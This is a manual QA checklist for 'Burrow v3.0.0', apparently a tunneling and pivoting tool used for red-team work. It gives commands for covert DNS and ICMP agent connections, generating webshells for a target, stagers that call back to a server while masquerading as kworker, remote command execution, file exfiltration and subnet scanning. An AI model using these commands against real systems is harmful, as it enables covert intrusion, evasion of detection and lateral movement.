# Manual Testing Checklist — Burrow v3.0.0

Pre-release verification items that require hands-on testing with live infrastructure.

## 1. End-to-End Agent ↔ Server Connection

**Goal:** Confirm full tunnel lifecycle over each transport.

```bash
# Terminal 1: Start server with TUI
burrow server --tui

# Terminal 2: Connect agent (repeat for each transport)
burrow agent -c 127.0.0.1:11601                          # raw TCP/TLS
burrow agent -c wss://127.0.0.1:443 -t ws                # WebSocket
burrow agent -c 127.0.0.1:5353 -t dns                    # DNS tunnel
burrow agent -c 127.0.0.1 -t icmp                        # ICMP (requires root)
burrow agent -c 127.0.0.1:8080 -t http                   # HTTP polling
```

**Verify per transport:**
- [ ] Agent connects and appears in TUI session list
- [ ] Session shows correct hostname, OS, IPs, PID
- [ ] TLS fingerprint displays correctly (or "(no TLS)" with `--no-tls`)
- [ ] Agent reconnects after server restart (with `--max-retries`)
- [ ] Graceful shutdown on Ctrl+C from both sides

## 2. Tunnel Operations (TUI)

```
# In TUI session detail view:
t  → add tunnel (local, 127.0.0.1:8080, 10.0.0.1:80, tcp)
u  → start tunnel
n  → stop tunnel
d  → delete tunnel
```

- [ ] Local port forward works (curl through tunnel reaches target)
- [ ] Remote port forward works
- [ ] Tunnel start/stop/delete reflect correctly in TUI
- [ ] Bandwidth counters update during traffic
- [ ] Sparkline graph shows activity

## 3. TUN Interface

```
# In TUI, press Ctrl+T to toggle TUN
# Then add routes:
r  → add route (e.g. 10.0.0.0/24)
```

- [ ] TUN starts successfully (requires root on server side)
- [ ] Route addition works and traffic routes through TUN
- [ ] `ping 10.0.0.x` resolves through the tunnel
- [ ] TUN stop cleans up kernel routes
- [ ] Non-root falls back to SOCKS5 gracefully

## 4. SOCKS5 Proxy

```
# In TUI detail view, press 's' to toggle SOCKS5
# Then test:
curl --socks5 127.0.0.1:1080 http://internal-host/
```

- [ ] SOCKS5 starts and shows address in TUI
- [ ] Traffic routes through agent to target network
- [ ] Multiple concurrent connections work
- [ ] SOCKS5 stop is clean

## 5. Command Execution & File Operations (TUI)

```
# In TUI detail view:
x  → execute command (e.g. "whoami", "dir C:\")
w  → download file (e.g. "/etc/hostname")
p  → upload file
o  → view exec history
```

- [ ] Command output displays correctly
- [ ] File download completes and shows size
- [ ] File upload sends data to agent
- [ ] Exec history retains entries and scrolls

## 6. WebUI Dashboard

```bash
burrow server --webui --mcp-api
# Open browser to http://localhost:9090?token=<displayed-token>
```

- [ ] Dashboard loads, sessions appear in sidebar
- [ ] Selecting session shows detail panel with tunnels/routes
- [ ] **Add tunnel** form creates tunnel, table updates
- [ ] **Start/Stop/Delete** tunnel buttons work
- [ ] **Add/Remove route** works
- [ ] **TUN Start/Stop** buttons work (new feature)
- [ ] **Execute Command** input runs command, output displays (new feature)
- [ ] **File Download** fetches file, SAVE button triggers browser download (new feature)
- [ ] **File Upload** file picker + path input uploads successfully (new feature)
- [ ] SSE indicator shows green "SSE LIVE"
- [ ] Error banner appears on failures and auto-dismisses
- [ ] Auth token persists across page reloads (localStorage)

## 7. HTTP Tunnel (Webshell)

```bash
# Generate webshell
burrow generate webshell -f php -k s3cret -o /tmp/tunnel.php

# Deploy to target web server, then:
burrow httptunnel client -c http://target/tunnel.php -k s3cret -l 127.0.0.1:1080

# Test SOCKS5:
curl --socks5 127.0.0.1:1080 http://internal-host/
```

- [ ] PHP webshell generates correctly
- [ ] ASPX webshell generates correctly
- [ ] JSP webshell generates correctly
- [ ] Client connects and SOCKS5 proxy works through webshell

## 8. Stager

```bash
# On server:
burrow server -l 0.0.0.0:11601

# On target (Linux):
./stager-linux-amd64 -c server-ip:11601

# On target (Windows):
stager-windows-amd64.exe -c server-ip:11601
```

- [ ] Linux stager connects and creates session
- [ ] Windows stager connects and creates session
- [ ] Command execution works through stager session
- [ ] File transfer works through stager session
- [ ] Stager reconnects with backoff after disconnect
- [ ] Process masquerade works on Linux (`ps aux` shows kworker)
- [ ] Multi-server fallback rotates on failure

## 9. Network Discovery

```bash
burrow scan -s 10.0.0.0/24
burrow scan -s 192.168.1.0/24 -p 22,80,443,3389 --timeout 3s
```

- [ ] Hosts discovered with open ports listed
- [ ] PIVOT markers appear for interesting hosts
- [ ] Concurrency flag affects scan speed
- [ ] Invalid timeout shows warning (not silent default)

## 10. Cross-Platform Display

- [ ] **Linux terminal** — TUI renders correctly (tested in primary dev env)
- [ ] **macOS Terminal.app** — TUI renders correctly (box-drawing chars, colors)
- [ ] **Windows Terminal** — TUI renders correctly (ANSI 256 colors, braille spinner)
- [ ] **tmux/screen** — TUI works inside multiplexer (no rendering artifacts)
- [ ] **SSH session** — TUI works over SSH with proper terminal forwarding

## 11. Relay

```bash
burrow relay tcp-listen:8080 tcp:10.0.0.1:80
burrow relay stdio tcp:10.0.0.1:22
```

- [ ] TCP relay forwards traffic bidirectionally
- [ ] Stdio relay works for interactive sessions
- [ ] Stats display on shutdown

## 12. Pivot Chain

```bash
burrow pivot --target 10.0.0.3 -p 8443 --hop 10.0.0.1:22 --hop 10.0.0.2:22
```

- [ ] Chain establishes through all hops
- [ ] Local listener (--local-port) works
- [ ] Latency info displays per hop
